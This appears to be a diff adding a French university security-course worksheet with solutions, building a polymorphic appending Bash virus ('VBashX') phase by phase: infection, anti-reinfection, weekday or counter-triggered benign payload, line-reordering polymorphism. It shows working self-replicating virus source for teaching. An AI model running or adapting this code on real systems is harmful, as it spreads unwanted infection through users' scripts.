@@ -1,0 +1,885 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+\usepackage{graphicx}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{comment}
+\usepackage{array}
+\usepackage{booktabs}
+
+% --- Packages ajoutés pour l'enrichissement pédagogique ---
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{hyperref}
+
+%%%%%%%%%%%%%%% CONFIGURATION LISTINGS %%%%%%%%%%%%%%%%%%%
+
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    language=bash,
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=8pt,
+    numberstyle=\tiny\color{codegray},
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
+}
+
+%%%%%%%%%%%%%%% ENVIRONNEMENTS TCOLORBOX %%%%%%%%%%%%%%%%%%
+
+% Rappel de cours (fond bleu clair)
+\newtcolorbox{rappel}[1][]{
+    colback=blue!5!white,
+    colframe=blue!50!black,
+    fonttitle=\bfseries,
+    title={\large Rappel de cours},
+    #1
+}
+
+% Point clé (fond vert clair)
+\newtcolorbox{pointcle}[1][]{
+    colback=green!5!white,
+    colframe=green!40!black,
+    fonttitle=\bfseries,
+    title={Point clé à retenir},
+    #1
+}
+
+% Attention (fond orange clair)
+\newtcolorbox{attention}[1][]{
+    colback=orange!8!white,
+    colframe=orange!60!black,
+    fonttitle=\bfseries,
+    title={Attention},
+    #1
+}
+
+% Avertissement éthique (fond rouge)
+\newtcolorbox{ethique}[1][]{
+    colback=red!5!white,
+    colframe=red!60!black,
+    fonttitle=\bfseries\large,
+    title={Avertissement éthique et légal},
+    #1
+}
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+%% Les ensembles de modelisation
+\newcommand{\Ki}{\mathcal{K}}
+\newcommand{\Ci}{\mathcal{C}}
+\newcommand{\Mi}{\mathcal{M}}
+\newcommand{\Ei}{\mathcal{E}}
+\newcommand{\Di}{\mathcal{D}}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemme}
+\newtheorem{algorithme}{Algorithme}
+\newtheorem{corolaire}{Corollaire}
+\newtheorem{propriete}{Propri\'et\'e}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme}{Th\'eor\`eme}
+\newtheorem{definition}{D\'efinition}
+\newtheorem{correction}{Correction}
+%\excludecomment{correction}
+
+\theoremstyle{definition}
+\newtheorem*{probleme}{Problème}
+\newtheorem*{cout}{Coût}
+\newtheorem*{fait}{Fait}
+\newtheorem*{notation}{Notation}
+\newtheorem*{complexite}{Complexit\'e}
+\newtheorem{exercice}{Exercice}
+\newtheorem{remarque}{Remarque}
+\newtheorem{exemple}{Exemple}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!60!black,
+    urlcolor=blue!60!black
+}
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{Université de Perpignan} \hfill  L3 Informatique \\
+ \hfill C. Legrand \hfill  Année \the\year  \\
+\smallskip
+\begin{center}
+{
+ {\scshape \large TD4 Sécurité Informatique -- Corrigé}  \\
+ Projet VBashX -- Virus par ajout en Bash
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+
+\bigskip
+
+% --- Avertissement éthique ---
+\begin{ethique}
+Les techniques présentées dans ce TD sont étudiées dans un \textbf{cadre strictement académique} afin de comprendre les mécanismes utilisés par les logiciels malveillants et ainsi pouvoir mieux s'en protéger.
+
+\textbf{Toute utilisation de ces techniques en dehors du cadre pédagogique est illégale} et passible de sanctions pénales (chapitre III du Code pénal, articles 323-1 à 323-8 -- \textit{Des atteintes aux systèmes de traitement automatisé de données}) :
+\begin{itemize}
+    \item Accès ou maintien frauduleux dans un STAD (art.~323-1) : \textbf{3 ans} d'emprisonnement et \textbf{100\,000\,\texteuro{}} d'amende
+    \item Entrave au fonctionnement d'un STAD (art.~323-2) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
+    \item Introduction frauduleuse de données dans un STAD (art.~323-3) : \textbf{5 ans} d'emprisonnement et \textbf{150\,000\,\texteuro{}} d'amende
+\end{itemize}
+Peines portées à \textbf{7 ans} et \textbf{300\,000\,\texteuro{}} lorsque le système visé traite des données à caractère personnel mis en \oe uvre par l'État, et jusqu'à \textbf{10 ans} et \textbf{300\,000\,\texteuro{}} en bande organisée (art.~323-4-1). \textit{Peines mises à jour par la loi LOPMI n\textsuperscript{o}2023-22 du 24 janvier 2023.}
+\end{ethique}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% INTRODUCTION
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\noindent
+Dans ce TD-projet, vous allez construire \textbf{brique par brique} un virus par ajout (\textit{appending}) en Bash, baptisé \textbf{VBashX}. Chaque phase ajoute une fonctionnalité au virus de la phase précédente, en reprenant et complétant les notions vues en cours (vbashp, anti-surinfection, polymorphisme par réordonnancement de lignes, charge utile conditionnelle).
+
+\medskip
+\noindent\textbf{Prérequis :} TD3 (scripts Bash, virus écrasant, chiffrement par substitution).
+
+\bigskip
+
+{\Large Méthode de travail :} Pour chaque phase, procédez comme suit :
+\begin{itemize}
+\item Créez un répertoire de test dédié à la phase (ex : \texttt{test\_phase1/}).
+\item Copiez-y votre virus et les fichiers cibles (\texttt{cible1.sh}, \texttt{cible2.sh}).
+\item Exécutez le virus et analysez les résultats \textbf{avant} de passer à la phase suivante.
+\item Ne travaillez \textbf{jamais} directement dans votre répertoire de développement.
+\end{itemize}
+
+\noindent Fichiers cibles de test :
+\begin{lstlisting}[title=cible1.sh]
+#!/bin/bash
+echo "I am target program 1"
+echo "Running normally..."
+\end{lstlisting}
+\begin{lstlisting}[title=cible2.sh]
+#!/bin/bash
+echo "I am target program 2"
+echo "Everything is fine."
+\end{lstlisting}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCICE UNIQUE : Projet VBashX
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Projet VBashX]$\;$
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 1 : Virus par ajout simple
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 1 -- Virus par ajout simple}
+
+\begin{rappel}
+\textbf{Virus par ajout (\textit{appending virus}) :}
+
+Contrairement au virus écrasant (TD3) qui détruit le programme hôte, le virus par ajout \textbf{ajoute} son code à la fin du fichier cible. Le programme original reste fonctionnel.
+
+\medskip
+\textbf{Schéma textuel :}
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white},language={}]
+AVANT infection :              APRES infection :
++---------------------+       +---------------------+
+| Programme hote      |       | Programme hote      |
+| (code original)     |       | (code original)     |
+| N lignes            |       | N lignes            |
++---------------------+       +---------------------+
+                               | Code du virus       |
+                               | (ajout en fin)      |
+                               | VIRUS_SIZE lignes   |
+                               +---------------------+
+
+Le programme hote s'execute d'abord, puis le code viral.
+\end{lstlisting}
+
+\medskip
+\textbf{Commandes clés :}
+\begin{itemize}
+    \item \texttt{tail -n K \$0} : extrait les \texttt{K} dernières lignes du script en cours d'exécution (auto-extraction du code viral)
+    \item \texttt{>> fichier} : ajoute en fin de fichier (sans écraser)
+    \item \texttt{basename \$0} : nom du script sans le chemin
+\end{itemize}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{1a)}] Écrire un script \texttt{vbashx.sh} qui, pour chaque fichier \texttt{.sh} du répertoire courant (autre que lui-même), ajoute ses propres \texttt{VIRUS\_SIZE} dernières lignes à la fin du fichier cible. Indication : utiliser \texttt{tail~-n~\$VIRUS\_SIZE~"\$0"~>>~"\$f"}.
+
+\item[\textbf{1b)}] Tester : créer \texttt{cible1.sh} et \texttt{cible2.sh} (simples \texttt{echo}). Exécuter le virus, puis les cibles. Le code hôte s'exécute-t-il toujours ?
+
+\item[\textbf{1c)}] Exécuter un fichier infecté. Que se passe-t-il ? Pourquoi ?
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{1a)} Le script suivant implémente un virus par ajout simple :
+\begin{lstlisting}[title=vbashx\_phase1.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Phase 1 ---
+VIRUS_SIZE=7
+for f in *.sh; do
+    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
+        tail -n $VIRUS_SIZE "$0" >> "$f"
+    fi
+done
+\end{lstlisting}
+
+\textbf{1b)} Après exécution du virus, les fichiers cibles contiennent leur code original suivi du code viral. Lorsqu'on exécute une cible, le code hôte s'exécute d'abord (les \texttt{echo} affichent leur message), puis le code viral s'exécute et propage l'infection aux autres fichiers \texttt{.sh}.
+
+\textbf{1c)} Lorsqu'on exécute un fichier infecté, celui-ci propage le virus aux autres fichiers \texttt{.sh} du répertoire. C'est la \textbf{propagation de proche en proche} : chaque fichier infecté devient à son tour un vecteur d'infection.
+
+\begin{attention}
+Le virus souffre d'un problème majeur : il \textbf{réinfecte} les fichiers déjà infectés à chaque exécution. La taille des fichiers augmente indéfiniment. Ce problème sera résolu en Phase 2.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item \texttt{tail -n K \$0} permet l'\textbf{auto-extraction} du code viral depuis le fichier en cours d'exécution.
+    \item L'opérateur \texttt{>>} ajoute en fin de fichier sans écraser le contenu existant.
+    \item Le code viral s'exécute \textbf{après} le code hôte : le programme original reste fonctionnel.
+    \item La valeur de \texttt{VIRUS\_SIZE} doit correspondre \textbf{exactement} au nombre de lignes du code viral (du commentaire de début au \texttt{done} final).
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 2 : Anti-surinfection
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 2 -- Lutte contre la surinfection}
+
+\begin{rappel}
+\textbf{Surinfection et stratégies anti-surinfection :}
+
+La \textbf{surinfection} (ou réinfection) se produit lorsqu'un virus infecte un fichier déjà infecté. Cela provoque une croissance indéfinie de la taille des fichiers, ce qui constitue un \textbf{indicateur de compromission} (IoC) facilement détectable.
+
+\medskip
+\textbf{Trois stratégies principales :}
+
+\begin{center}
+\begin{tabular}{lp{5cm}p{4cm}}
+\toprule
+\textbf{Stratégie} & \textbf{Principe} & \textbf{Caractéristique} \\
+\midrule
+\textbf{Par marqueur} & Insérer une signature unique dans le code viral ; vérifier sa présence avant infection & Discriminante (la signature est détectable par un antivirus) \\
+\textbf{Par comparaison tail} & Comparer les dernières lignes de la cible avec celles du virus & Non discriminante mais fragile au polymorphisme \\
+\textbf{Par exécution test} & Exécuter les dernières lignes avec un argument test et analyser la sortie & Non incriminante mais plus complexe \\
+\bottomrule
+\end{tabular}
+\end{center}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{2a)}] \textbf{Stratégie par marqueur :} Modifier le virus pour insérer une signature (ex : \texttt{VBX\_7k9Pz}) dans le code viral. Avant d'infecter un fichier, vérifier avec \texttt{grep} si la signature est déjà présente. Indication : \texttt{[ -z "\$(grep "VBX\_7k9Pz" "\$f")" ]}.
+
+\item[\textbf{2b)}] \textbf{Stratégie par comparaison tail :} Implémenter une alternative qui compare les \texttt{VIRUS\_SIZE} dernières lignes de la cible avec celles du virus. Utiliser \texttt{echo -n \$(tail -n ...)} pour normaliser les retours à la ligne.
+
+\item[\textbf{2c)}] \textbf{Stratégie par exécution test :} Expliquer le principe (sans implémenter) : isoler les dernières lignes du fichier, les exécuter avec un argument spécial (ex : \texttt{--vbx-test}), analyser la sortie. Quels sont les avantages et inconvénients ?
+
+\item[\textbf{2d)}] Remplir un tableau comparatif des 3 stratégies selon les critères : fiabilité, discrétion, robustesse au polymorphisme.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{2a)} Virus avec anti-surinfection par marqueur :
+\begin{lstlisting}[title=vbashx\_phase2a.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Phase 2a --- VBX_7k9Pz
+MARKER="VBX_7k9Pz"
+VIRUS_SIZE=10
+for f in *.sh; do
+    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
+        if [ -z "$(grep "$MARKER" "$f")" ]; then
+            tail -n $VIRUS_SIZE "$0" >> "$f"
+        fi
+    fi
+done
+\end{lstlisting}
+
+\textbf{2b)} Virus avec anti-surinfection par comparaison tail :
+\begin{lstlisting}[title=vbashx\_phase2b.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Phase 2b ---
+VIRUS_SIZE=11
+MY_CODE=$(echo -n $(tail -n $VIRUS_SIZE "$0"))
+for f in *.sh; do
+    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
+        TARGET_CODE=$(echo -n $(tail -n $VIRUS_SIZE "$f"))
+        if [ "$MY_CODE" != "$TARGET_CODE" ]; then
+            tail -n $VIRUS_SIZE "$0" >> "$f"
+        fi
+    fi
+done
+\end{lstlisting}
+
+\textbf{2c)} \textbf{Stratégie par exécution test :} On extrait les dernières \texttt{VIRUS\_SIZE} lignes du fichier cible dans un fichier temporaire, on l'exécute avec un argument spécial (ex : \texttt{./tmp\_test.sh --vbx-test}). Si le code viral est présent, il détecte l'argument et retourne un code spécifique (ex : \texttt{exit 42}).
+
+\textit{Avantages :} Non incriminant (pas de signature en clair), fonctionne même si le code viral change de forme.
+
+\textit{Inconvénients :} Plus complexe à implémenter, nécessite l'exécution de code potentiellement dangereux, plus lent (fork + exec pour chaque fichier testé).
+
+\textbf{2d)} Tableau comparatif :
+\begin{center}
+\begin{tabular}{lccc}
+\toprule
+\textbf{Critère} & \textbf{Marqueur} & \textbf{Comparaison tail} & \textbf{Exécution test} \\
+\midrule
+Fiabilité & Élevée & Moyenne & Élevée \\
+Discrétion & Faible (signature en clair) & Moyenne & Élevée \\
+Robustesse au polymorphisme & Oui & Non & Oui \\
+Complexité & Faible & Faible & Élevée \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\begin{attention}
+La signature en clair (\texttt{VBX\_7k9Pz}) rend le virus vulnérable à une \textbf{détection antivirale} : un simple \texttt{grep} permet de trouver tous les fichiers infectés. C'est le prix à payer pour la fiabilité de la stratégie par marqueur. Nous exploiterons cette faiblesse en Phase~6.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item La surinfection est un \textbf{défaut classique} des virus simples, facilement détectable par la croissance anormale de la taille des fichiers.
+    \item La stratégie par \textbf{marqueur} (\texttt{grep}) est la plus fiable mais la moins discrète.
+    \item La stratégie par \textbf{comparaison tail} ne laisse pas de signature explicite mais échoue si le code viral change de forme (polymorphisme).
+    \item Le choix de la stratégie anti-surinfection a un impact direct sur la \textbf{détectabilité} du virus.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 3 : Charge utile conditionnelle
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 3 -- Charge utile conditionnelle}
+
+\begin{rappel}
+\textbf{Charge utile (\textit{payload}) et déclencheurs :}
+
+La \textbf{charge utile} est l'action malveillante effectuée par le virus (affichage de message, suppression de fichiers, chiffrement, etc.). Elle est généralement activée par un \textbf{déclencheur} (\textit{trigger}) conditionnel :
+
+\begin{itemize}
+    \item \textbf{Temporel :} activée à une date/heure précise (ex : vendredi, 1\textsuperscript{er} avril)
+    \item \textbf{Par compteur :} activée après un certain nombre d'exécutions
+    \item \textbf{Événementiel :} activée par un événement système (connexion réseau, fichier présent, etc.)
+\end{itemize}
+
+\textbf{Commandes utiles :}
+\begin{itemize}
+    \item \texttt{date +\%u} : jour de la semaine (1=lundi, \ldots, 5=vendredi, 7=dimanche)
+    \item \texttt{date +\%d} : jour du mois (01--31)
+    \item Fichiers cachés : un nom commençant par \texttt{.} (point) est masqué par \texttt{ls}
+\end{itemize}
+
+\textit{Lien avec TD02 :} les bombes logiques utilisent le même principe de déclencheur conditionnel.
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{3a)}] Ajouter une charge utile activée uniquement le \textbf{vendredi}. Utiliser \texttt{date +\%u} (5=vendredi). La charge utile sera un simple \texttt{echo} (pas destructif !). Intégrer cette fonctionnalité au virus de Phase 2a.
+
+\item[\textbf{3b)}] Variante avec \textbf{compteur} : utiliser un fichier caché \texttt{.vbx\_count} incrémenté à chaque exécution du virus. La charge utile se déclenche après 3 exécutions.
+
+\item[\textbf{3c)}] Proposer une méthode pour tester le déclencheur vendredi sans attendre vendredi. Indication : explorer les options de \texttt{date -d}.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{3a)} Virus avec charge utile temporelle (vendredi) :
+\begin{lstlisting}[title=vbashx\_phase3a.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Phase 3a --- VBX_7k9Pz
+MARKER="VBX_7k9Pz"
+VIRUS_SIZE=15
+# Payload: triggered on Friday (day 5)
+if [ "$(date +%u)" -eq 5 ]; then
+    echo "[VBashX] PAYLOAD ACTIVATED - Today is Friday!"
+fi
+# Infection phase
+for f in *.sh; do
+    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
+        if [ -z "$(grep "$MARKER" "$f")" ]; then
+            tail -n $VIRUS_SIZE "$0" >> "$f"
+        fi
+    fi
+done
+\end{lstlisting}
+
+\textbf{3b)} Virus avec charge utile par compteur :
+\begin{lstlisting}[title=vbashx\_phase3b.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Phase 3b --- VBX_7k9Pz
+MARKER="VBX_7k9Pz"
+VIRUS_SIZE=23
+COUNTER_FILE=".vbx_count"
+# Increment execution counter
+if [ -f "$COUNTER_FILE" ]; then
+    COUNT=$(cat "$COUNTER_FILE")
+    COUNT=$(($COUNT + 1))
+else
+    COUNT=1
+fi
+echo $COUNT > "$COUNTER_FILE"
+# Payload: triggered after 3 executions
+if [ $COUNT -ge 3 ]; then
+    echo "[VBashX] PAYLOAD: Execution count reached $COUNT!"
+fi
+# Infection phase
+for f in *.sh; do
+    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
+        if [ -z "$(grep "$MARKER" "$f")" ]; then
+            tail -n $VIRUS_SIZE "$0" >> "$f"
+    fi; fi
+done
+\end{lstlisting}
+
+\textbf{3c)} Pour tester le déclencheur vendredi sans attendre, on peut utiliser \texttt{date -d} pour simuler une date :
+\begin{lstlisting}[numbers=none]
+# Remplacer temporairement dans le script :
+# if [ "$(date +%u)" -eq 5 ]; then
+# par :
+if [ "$(date -d 'next Friday' +%u)" -eq 5 ]; then
+# Ou bien definir une fonction date() qui retourne une date simulee :
+date() { echo "5"; }
+\end{lstlisting}
+On peut aussi modifier temporairement la date système dans une VM : \texttt{sudo date -s "next Friday"}.
+
+\begin{pointcle}
+\begin{itemize}
+    \item \texttt{date +\%u} retourne le jour de la semaine sous forme numérique (1=lundi, 7=dimanche).
+    \item Les fichiers cachés (commençant par \texttt{.}) permettent de \textbf{persister un état} entre les exécutions du virus sans être visibles par \texttt{ls}.
+    \item La séparation entre \textbf{infection} et \textbf{payload} est un principe architectural important : le virus se propage indépendamment du déclenchement de la charge utile.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 4 : Polymorphisme par réordonnancement de lignes
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 4 -- Polymorphisme par réordonnancement de lignes}
+
+\begin{rappel}
+\textbf{Polymorphisme par permutation de lignes :}
+
+Le \textbf{polymorphisme} consiste à faire en sorte que chaque copie du virus soit différente, rendant la détection par signature du code viral plus difficile.
+
+Dans l'approche par \textbf{réordonnancement de lignes} (vue en cours), le code d'infection est découpé en lignes numérotées (\texttt{\#@1\#} à \texttt{\#@LI\#}). À chaque infection, ces lignes sont écrites dans un \textbf{ordre aléatoire} différent.
+
+\medskip
+\textbf{Structure du virus polymorphe (dans un fichier infecté) :}
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white},language={}]
++-----------------------------------+
+| Code hote original                |
++-----------------------------------+
+| Code de RESTAURATION (ordre fixe) |  <-- REST_SIZE lignes
+| - extrait les lignes taguees      |
+| - les remet dans l'ordre          |
+| - execute le code restaure        |
++-----------------------------------+
+| Lignes taguees #@1# a #@LI#      |  <-- LI lignes
+| (dans un ordre ALEATOIRE)         |      (en ordre permute)
++-----------------------------------+
+VIRUS_SIZE = REST_SIZE + LI
+\end{lstlisting}
+
+\medskip
+\textbf{Formule de permutation :} $n_i = (r \times 3^i) \bmod 17$
+
+Les puissances de 3 modulo 17 (nombre premier) engendrent tous les entiers de 1 à 16. Avec un germe aléatoire $r$, la formule itérative $r \leftarrow (r \times 3) \bmod 17$ produit une permutation complète.
+
+\medskip
+\textbf{Table des permutations} (germe $r = 1$) :
+
+\begin{center}
+\begin{tabular}{c|cccccccccccccccc}
+\toprule
+Itération & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 & 9 & 10 & 11 & 12 & 13 & 14 & 15 & 16 \\
+\midrule
+Ligne $n_i$ & 3 & 9 & 10 & 13 & 5 & 15 & 11 & 16 & 14 & 8 & 7 & 4 & 12 & 2 & 6 & 1 \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\medskip
+\textbf{Processus d'exécution d'un fichier infecté :}
+\begin{enumerate}
+    \item Le code hôte s'exécute normalement
+    \item Le code de \textbf{restauration} s'exécute :
+    \begin{enumerate}
+        \item Extrait les lignes \texttt{\#@1\#} à \texttt{\#@LI\#} dans l'ordre
+        \item Les écrit dans un fichier temporaire
+        \item Exécute le fichier temporaire
+    \end{enumerate}
+    \item Le fichier temporaire (code d'infection en ordre) s'exécute et infecte les cibles avec une \textbf{nouvelle permutation}
+\end{enumerate}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{4a)}] \textbf{Code de restauration :} Écrire le code (non tagué, ordre fixe) qui extrait les lignes \texttt{\#@1\#} à \texttt{\#@LI\#} du fichier courant dans l'ordre, les écrit dans un fichier temporaire, l'exécute, puis fait \texttt{exit 0}. Le fichier temporaire doit connaître le chemin du fichier source (via une variable \texttt{SRC}).
+
+Indication : \texttt{grep "\#@\$\{nb\}\#" "\$0"} pour extraire la ligne numéro \texttt{nb}.
+
+\item[\textbf{4b)}] \textbf{Code d'infection tagué :} Écrire le code d'infection en \textbf{16 lignes}, chacune taguée \texttt{\#@n\#} (le tag est un commentaire Bash en fin de ligne). Ce code doit :
+\begin{itemize}
+    \item Vérifier la surinfection par marqueur
+    \item Ajouter le code de restauration à la cible (via \texttt{tail -n \$VS "\$SRC" | head -n \$REST\_S})
+    \item Ajouter les 16 lignes taguées dans un \textbf{ordre aléatoire} en utilisant la formule $r \leftarrow (r \times 3) \bmod 17$ avec un germe initial aléatoire : \texttt{r=\$(( (\$RANDOM \% 16) + 1 ))}
+\end{itemize}
+
+\item[\textbf{4c)}] Tester : infecter 2 cibles, comparer le contenu viral dans chacune. Les lignes taguées sont-elles dans un ordre différent ?
+
+\item[\textbf{4d)}] Parmi les 3 stratégies de Phase 2, lesquelles fonctionnent encore avec le polymorphisme ? Justifier.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{4a+4b)} Le virus complet avec polymorphisme par réordonnancement :
+\begin{lstlisting}[title=vbashx\_phase4.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Restoration --- VBX_7k9Pz
+REST_SIZE=11
+LI=16
+VIRUS_SIZE=$(($REST_SIZE + $LI))
+TMP=".vbx_tmp.sh"
+echo "#!/bin/bash" > $TMP
+echo "SRC=\"$0\"" >> $TMP
+nb=1; while [ $nb -le $LI ]; do
+grep "#@${nb}#" "$0" >> $TMP
+nb=$(($nb + 1)); done
+chmod +x $TMP && ./$TMP; rm -f $TMP; exit 0
+MARKER="VBX_7k9Pz" #@1#
+for f in *.sh; do #@2#
+if [ "$(basename "$f")" != "$(basename "$SRC")" ]; then #@3#
+if [ -z "$(grep "$MARKER" "$f")" ]; then #@4#
+REST_S=11; LI_S=16; VS=$(($REST_S + $LI_S)) #@5#
+tail -n $VS "$SRC" | head -n $REST_S >> "$f" #@6#
+r=$(( ($RANDOM % 16) + 1 )) #@7#
+n=1 #@8#
+while [ $n -le $LI_S ]; do #@9#
+grep "#@${r}#" "$SRC" >> "$f" #@10#
+r=$(( ($r * 3) % 17 )) #@11#
+n=$(($n + 1)) #@12#
+done #@13#
+fi #@14#
+fi #@15#
+done #@16#
+\end{lstlisting}
+
+\textbf{Explication du code :}
+\begin{itemize}
+    \item \textbf{Lignes 3--13} (code de restauration, non tagué) : extrait les 16 lignes taguées dans l'ordre (1, 2, \ldots, 16), les écrit dans \texttt{.vbx\_tmp.sh} avec le chemin source, exécute ce fichier, puis termine par \texttt{exit 0}.
+    \item \textbf{Lignes 14--29} (code d'infection, tagué \texttt{\#@1\#} à \texttt{\#@16\#}) : ces lignes sont en ordre quelconque dans le fichier mais le code de restauration les remet en ordre avant exécution. Elles vérifient la surinfection, copient le code de restauration dans la cible, puis ajoutent les lignes taguées dans un ordre aléatoire via la formule $r \leftarrow (r \times 3) \bmod 17$.
+\end{itemize}
+
+\textbf{4c)} En comparant deux fichiers infectés, on constate que les lignes taguées sont dans un \textbf{ordre différent} (le germe aléatoire \texttt{\$RANDOM} est différent à chaque exécution). Le code de restauration, en revanche, est \textbf{identique} dans tous les fichiers infectés.
+
+\textbf{4d)} Compatibilité des stratégies anti-surinfection avec le polymorphisme :
+\begin{center}
+\begin{tabular}{lcc}
+\toprule
+\textbf{Stratégie} & \textbf{Compatible ?} & \textbf{Raison} \\
+\midrule
+Par marqueur & $\checkmark$ Oui & La signature est dans les lignes taguées, elle est toujours présente \\
+Par comparaison tail & $\times$ Non & Les dernières lignes changent d'ordre à chaque infection \\
+Par exécution test & $\checkmark$ Oui & Le code restauré produit toujours le même comportement \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\begin{attention}
+Bien compter \texttt{VIRUS\_SIZE = REST\_SIZE + LI}. Le code de restauration n'est \textbf{pas} tagué (il reste en ordre fixe), seul le code d'infection l'est. La variable \texttt{SRC} dans le fichier temporaire contient le chemin du fichier infecté source, ce qui permet au code d'infection d'accéder aux lignes taguées.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item Le code de restauration reste \textbf{identique} dans tous les fichiers infectés : c'est un \textbf{invariant} exploitable par un antivirus (cf. Phase 6).
+    \item Le polymorphisme par réordonnancement empêche la détection par \textbf{comparaison de code} mais pas par \textbf{signature du décrypteur/restaurateur}.
+    \item La formule $r \leftarrow (r \times 3) \bmod 17$ est un \textbf{générateur de permutations} car 3 est une racine primitive modulo 17 (nombre premier). Elle engendre les 16 valeurs de 1 à 16 sans répétition.
+    \item Les tags \texttt{\#@n\#} sont des commentaires Bash valides : le code fonctionne même si les tags ne sont pas supprimés.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 5 : Furtivité
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
